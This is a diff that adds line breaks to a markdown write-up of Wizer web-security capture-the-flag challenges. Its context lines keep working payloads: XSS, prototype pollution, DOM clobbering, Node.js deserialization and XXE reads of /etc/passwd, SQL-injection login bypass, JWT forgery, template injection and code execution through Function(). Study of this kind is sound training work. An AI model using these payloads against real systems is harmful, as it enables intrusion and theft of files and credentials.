@@ -1,6 +1,6 @@
-# Challenges # 0-5
+# Wizer CTF Challenges
 
-
+<br />
 
 ### #0: My First CTF Experience!
 
@@ -23,11 +23,11 @@
 </html>
 ```
 
-
+<br />
 
 it is just take whatever the user writes after `role` parameter and print it on the page in `h1` tag
 
-
+<br />
 
 **Solution:**
 
@@ -37,7 +37,7 @@ https://chal0.vercel.app/dashboard.html?role=<script>alert("Wizer")</script>
 
 
 
-
+<br /><br />
 
 
 
@@ -83,7 +83,7 @@ the source of the image is taken from `image` parameter, then DOMPurity will san
 
 however we can use event handlers like `onerror` to exploit the xss
 
-
+<br />
 
 **Solution:**
 
@@ -93,7 +93,7 @@ https://chal1.vercel.app/dashboard.html?image=x" onerror="alert('Wizer')
 
 
 
-
+<br /><br />
 
 
 
@@ -160,7 +160,7 @@ module.exports = app;
 
 we need to create an admin user. this endpoint allows us to create a user and also admin. but to create admin we need an invitation code and we do not have access to the invitation code.
 
-
+<br />
 
 if you tried to create a new user
 
@@ -172,7 +172,7 @@ if you tried to create a new user
 
 it will create a user not an admin.
 
-
+<br />
 
 if you tried to add `isAdmin` in the request
 
@@ -185,7 +185,7 @@ if you tried to add `isAdmin` in the request
 
 you will get `No invite code? No admin!`
 
-
+<br />
 
 the vulnerability here is prototype pollution
 
@@ -199,7 +199,7 @@ if we add `__proto__:{ "isAdmin": true}`
 
 now every user will have `isAdmin` property and the default is `true`
 
-
+<br />
 
 **Solution:**
 
@@ -214,7 +214,7 @@ now every user will have `isAdmin` property and the default is `true`
 
 
 
-
+<br /><br />
 
 
 
@@ -256,7 +256,7 @@ header("Content-Security-Policy: script-src 'nonce-$nonce'");
 
 The HTML nonce attribute is a global content attribute that defines a cryptographic nonce(” number used once “). It is used by Content Security Policy(it is an additional layer of security that helps to detect and mitigate certain types of attacks like data injection attacks) to check whether a given fetch will be allowed to proceed for a given element or not. Generally, the attribute nonce specifies the way by which the browser is told that inline contents of some style element or specific/particular script were not injected into the document by third parties and were put in the document intentionally by whoever controls the server from where the document is served. It allows the list of specific elements such as some specific inline script or style elements. It helps to avoid the use of the CSP unsafe-inline directive that would allow-list all inline styles.
 
-
+<br />
 
 we need to skip the script line `window.environment = 'production'`. we need to force it to be empty or anything rather than "production".
 
@@ -268,7 +268,7 @@ We can use DOM Clobbering to make the window.environment = anything by adding a 
 
 ![](./assets/1.png)
 
-
+<br />
 
 **Solution:**
 
@@ -276,14 +276,14 @@ We can use DOM Clobbering to make the window.environment = anything by adding a 
 https://starfish-app-vexnk.ondigitalocean.app/?debug=alert("Wizer")&name=test</title><a id=environment><script>
 ```
 
-
+<br />
 
 **References:**
 
 - https://www.geeksforgeeks.org/html-nonce-attribute/
 - https://content-security-policy.com/nonce/
 
-
+<br /><br />
 
 
 
@@ -342,7 +342,7 @@ export default async (req, res) => {
 };
 ```
 
-
+<br />
 
 return a value
 
@@ -354,7 +354,7 @@ return a value
 "message":"_$$ND_FUNC$$_function(){ var a='lol' ;return a; }()"}
 ```
 
-
+<br />
 
 read files
 
@@ -366,7 +366,7 @@ read files
 "message":"_$$ND_FUNC$$_function(){ var fs = require('fs'); var result = fs.readFileSync('/etc/passwd', 'utf8'); return result; }()"}
 ```
 
-
+<br />
 
 read directories
 
@@ -378,7 +378,7 @@ read directories
 "message":"_$$ND_FUNC$$_function(){ var fs = require('fs'); var result = fs.readdirSync('/', 'utf8'); return result; }()"}
 ```
 
-
+<br />
 
 final
 
@@ -404,7 +404,7 @@ refrence:
 - https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
 - https://snyk.io/blog/preventing-insecure-deserialization-node-js/
 
-
+<br /><br />
 
 
 
@@ -416,7 +416,7 @@ refrence:
 
 
 
-
+<br /><br />
 
 ### **#8: Menu**
 
@@ -426,7 +426,7 @@ https://chal8.vercel.app/?directLink=javaScripjavaScriptt:alert("Wizer")
 
 Attackers will always attempt to bypass the sanitization by using common practices such as escaping special characters, but in this case, the easiest approach is to take advantage of the fact that the "replace" method performs only a single pass over the string, to replace the occurrences of a certain substring. With that in mind, strings such as `javajavascriptscript:[malicious code here]` will result with exactly what the developer was trying to prevent after the replace function is completed, which is `javascript:[malicious code here]`.
 
-
+<br /><br />
 
 
 
@@ -436,15 +436,15 @@ Attackers will always attempt to bypass the sanitization by using common practic
 {"firstName":"a\"><<!!ENTITY lastName SYSTEM \"file:///etc/passwd","role":"any"}
 ```
 
-
+<br /><br />
 
 ### **#10: Messages App**
 
-
+<br />
 
 In this challenge, the only code you have access to review is the front-end code, which is what's running in the browser, and it seems nicely protected against XSS. However, what happens if an attacker bypasses that front-end and interacts directly with the back-end API? A closer look into the views/addMessage page, reveals that the service invoked is `../api/addMessage`. A quick validation using any of the API testing tools (i.e. Postman or Burpsuite) uncovers the vulnerability, where the API code isn't protecting against saving malicious HTML into the message.
 
-
+<br />
 
 from inspect element => remove the id="floatingMessage" from the textarea element to bypass the sanitization of DOMPurity
 
@@ -470,7 +470,7 @@ Also you can just send the payload from burp to bypass the client side validatio
 
 
 
-
+<br /><br />
 
 
 
@@ -530,11 +530,11 @@ export default async (req, res) => {
 };
 ```
 
-
+<br />
 
 The code below showcases two API endpoints from a task management system: /users & /tasks. The first endpoint retrieves the users records of a specified list of user_ids and the second retrieves the tasks of a specified user-ID. Many players initially attempted to exploit a possible NO-SQLi vulnerability. However, the code is not actually vulnerable to NO-SQLi because the first endpoint does not allow any nesting, which is the typical NO-SQLi method in similar cases. This limitation is due to the type of argument it accepts—an array of IDs. On the other hand, the second endpoint converts the argument into a number, making NO-SQLi tricks possible as well. The user IDs are assigned as running sequential numbers.
 
-
+<br />
 
 taking a closer look at an IDOR vulnerability:
 
@@ -544,7 +544,7 @@ In this particular case, it is easy to guess other User-IDs. Based on one's user
 {"user_id":"10028"}
 ```
 
-
+<br /><br />
 
 ### **#12: List of Company Assets**
 
@@ -639,7 +639,7 @@ app.listen(process.env.port, () => {
 module.exports = app
 ```
 
-
+<br />
 
 
 
@@ -659,7 +659,7 @@ POST /companyAssets HTTP/2
 
 
 
-
+<br /><br />
 
 ### **#13: Company Logos**
 
@@ -747,7 +747,7 @@ POST /setCompanyLogo
 }
 ```
 
-
+<br />
 
 ```
 POST /getCompanyLogo
@@ -759,7 +759,7 @@ POST /getCompanyLogo
 
 
 
-
+<br /><br />
 
 ### **#15: Login Here**
 
@@ -812,7 +812,7 @@ export default async (req, res) => {
 };
 ```
 
-
+<br />
 
 
 
@@ -827,7 +827,7 @@ POST /api/login
 
 response: target: chal7.-.primary: vttablet: rpc error: code = InvalidArgument desc = The used SELECT statements have a different number of columns (errno 1222) (sqlstate 21000) (CallerID: an0lhxqhrn61aphfq1dy): Sql: "select * from users_tbl where userName = :userName 
 
-
+<br />
 
 
 
@@ -842,7 +842,7 @@ POST /api/login
 
 response: Illegal arguments: string, object. So the number of columns is 6.
 
-
+<br />
 
 ```
 POST /api/login
@@ -861,7 +861,7 @@ response: Invalid username or password
 
 
 
-
+<br />
 
 get the bcrypt hash of the "pass" with salt 10 using https://bcrypt.online/
 
@@ -895,7 +895,7 @@ response:
 
 The bcrypt string is a genuinely hashed password of our choice, which we'll provide as the value for the second argument, and as you can see, all the other values are literals of our choice. So the record returned is actually all fake and does the trick, where last and first name are correctly present. The "-- -" sequence at the end makes sure that whatever comes later, is commented out, so it's not in our way.
 
-
+<br /><br />
 
 
 
@@ -939,7 +939,7 @@ export default async (req, res) => {
 };
 ```
 
-
+<br />
 
 
 
@@ -953,7 +953,7 @@ POST /api/companies
 }
 ```
 
-
+<br /><br />
 
 ### **#17: Privacy Policy Viewer** 
 
@@ -1016,7 +1016,7 @@ export default async (req, res) => {
 };
 ```
 
-
+<br />
 
 ```
 POST /api/privacy
@@ -1026,7 +1026,7 @@ POST /api/privacy
 }
 ```
 
-
+<br /><br />
 
 
 
@@ -1110,7 +1110,7 @@ app.listen(port, () => {
 });
 ```
 
-
+<br />
 
 ```
 POST /register
@@ -1121,7 +1121,7 @@ POST /register
 }
 ```
 
-
+<br />
 
 ```
 POST /login
@@ -1132,7 +1132,7 @@ POST /login
 }
 ```
 
-
+<br />
 
 because you have the JWT secret "password123", you can generate a new valid JWT token with "isAdmin": true
 
@@ -1144,7 +1144,7 @@ POST /profile
 }
 ```
 
-
+<br /><br />
 
 
 
@@ -1184,7 +1184,7 @@ app.listen(process.env.port, () => {
 module.exports = app
 ```
 
-
+<br />
 
 ```
 POST /calc
@@ -1194,7 +1194,7 @@ POST /calc
 
 response: /var/task
 
-
+<br />
 
 ```
 POST /calc
@@ -1204,7 +1204,7 @@ POST /calc
 
 response: /var/task
 
-
+<br />
 
 The code below showcases a simple calculator endpoint. The developer figured this would be safer than just using eval because they read about scopes in JavaScript and noticed that Function() runs in a different scope. Today we prove that it's not safer at all! A requirement of the feature was to allow the consumers of the endpoint to take advantage of the `mathjs` library to enable calculations such as `100 + Math.sqrt(1000)`. To achieve that, the developer provided `require` as an external argument to the scope so that the isolated scope is able to run the following calculation: `100 + argument[0]('mathjs').sqrt(1000)`.
 
@@ -1218,7 +1218,7 @@ POST /calc
 
 response: 10
 
-
+<br />
 
 ```
 POST /calc
@@ -1232,7 +1232,7 @@ Never use `eval` nor `String(Function())` involving user input
 
 
 
-
+<br /><br />
 
 
 
@@ -1296,7 +1296,7 @@ app.listen(3000);
 console.log("Listening on port 3000");
 ```
 
-
+<br />
 
 we need to make this condition to be true to push the elements into the array and return them, so we will use one of the additional fields to be supported in the future (e.g. "city"), which means this value is "undefined". and in the body we will not add "value" parameter to be also "undefined". so the if condition will return true.
 
@@ -1308,7 +1308,7 @@ we need to make this condition to be true to push the elements into the array an
 
 
 
-
+<br /><br />
 
 ### **#37: SUPPORT TICKET**
 
@@ -1383,7 +1383,7 @@ const template = `<!DOCTYPE html><html>
 </html>`
 ```
 
-
+<br />
 
 we have XSS in the name parameter. but the csp blocks our script to be executed.
 
@@ -1395,7 +1395,7 @@ we need to
 
 to get the alert('Success!'); 
 
-
+<br />
 
 to achieve number 1,2 simply we can inject it in the name parameter
 
@@ -1405,23 +1405,25 @@ to achieve number 1,2 simply we can inject it in the name parameter
 
 ![](./assets/2.png)
 
-
+<br />
 
 to achieve number 3, we need to use DOM Clobbering to overwrite the span with the id=phone by inserting a new HTML element with id="phone"
 
 ![](./assets/3.png)
 
-
+<br /><br />
 
 ![](./assets/4.png)
 
 
 
-
+<br /><br />
 
 
 
 ![](./assets/5.png)
+
+<br /><br />
 
 ```
 ?name=Dave, please login <a href="https://chal15.vercel.app">here</a> to open a ticket<a id=phone>
@@ -1429,7 +1431,7 @@ to achieve number 3, we need to use DOM Clobbering to overwrite the span with th
 
 
 
-
+<br /><br />
 
 ### \#38: MY PROFILE NAME
 
@@ -1545,11 +1547,11 @@ module.exports = app;
 
 There are two issues in the code. The first issue is that it assumes that an array type `username` argument cannot be provided as the querystring parameter, and that's a wrong assumption. The second issue is that using a ejs template engine to render the message straight from the user-input is not safe, as it can be exploited to inject code.
 
-
+<br />
 
 First, the attacker would exploit the SSTI vulnerability using the `profileName` endpoint by providing the username `robertf` (known to exist based on the challenge's instructions). The `profileMessage` would include an escaped form of a new variable within the EJS format of <%= some-var %> to steal the value of the environment variable named `superAdminCode`. Escaping is critical since this API endpoint uses a GET request. Since many useful keywords are forbidden by the code, one way to bypass the validation would be `globalThis["p"+"rocess"]` OR `global["p"+"rocess"]`.
 
-
+<br />
 
 encode the url with URL encoding 
 
@@ -1563,7 +1565,7 @@ The response will be
 {"value":"Hello Robert Frank /var/task"}
 ````
 
-
+<br />
 
 To get the superAdminCode
 
@@ -1585,7 +1587,7 @@ return filteredProfiles.length && keyCheck ? filteredProfiles : keyCheck ? 'no-m
 
 So we need to send array of usernames one of them is "robertf "
 
-
+<br />
 
 ```
 GET /profileName?username[0]=robertf&username[1]=admin&key=784HDHASJJ3489JJFKSJ
@@ -1597,7 +1599,7 @@ The response will be
 {"value":[{"username":"robertf","name":"Robert Frank","id":"11009","key":"!!!6g44534i8j4589gj90kg5"}]}
 ```
 
-
+<br />
 
 Then validate the key
 
@@ -1610,7 +1612,7 @@ POST /checkKeyValidity
 
 
 
-
+<br /><br />
 
 
 
@@ -1626,7 +1628,7 @@ https://chal39-rfh85-a4e8a8b41487.herokuapp.com/?username=1234 kkkkk&messages=74
 
 
 
-
+<br /><br />
 
 ### **#41: COMPANIES API Phase 2**
 
@@ -1695,7 +1697,7 @@ OR
 }
 ```
 
-
+<br />
 
 Debugging code:
 
@@ -1737,7 +1739,7 @@ if (isValid(input)){
 
 
 
-
+<br /><br />
 
 
 
@@ -1786,7 +1788,7 @@ Note that the developer used `field` in this line `const results = filter(CRMUse
 
 in this condition `if (items[i][field] === value)`. it will be `field = i,d`  and  `value = undefined` and ` items[i][field] = undefined`. so it will be `if(undefined === undefined)`
 
-
+<br />
 
 ```json
 {"field":"i,d"}
@@ -1797,7 +1799,7 @@ reference:
 - https://www.mongodb.com/docs/manual/reference/operator/query/regex/
 - https://onecompiler.com/mongodb
 
-
+<br /><br />
 
 **Debugging code:**
 
@@ -1840,7 +1842,7 @@ if(availableFields.includes(fieldName)) {
 }  
 ```
 
-
+<br /><br />
 
 
 
@@ -1970,7 +1972,7 @@ POST /profile
 {"session":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzM3NzU3Nzk5LCJleHAiOjE3Mzc3NjEzOTl9.vr3C_OdRgnzTob5EDyPzeqYTs_7a0NWy0EYqZ3LL1EA"}
 ```
 
-
+<br />
 
 **Debugging code:**
 
@@ -2004,7 +2006,7 @@ console.log("users2 test pass: ",users["admin"].password);
 
 
 
-
+<br /><br />
 
 
 
@@ -2072,7 +2074,7 @@ app.listen(process.env.PORT, () => {
 });
 ```
 
-
+<br />
 
 **Debugging code:**
 
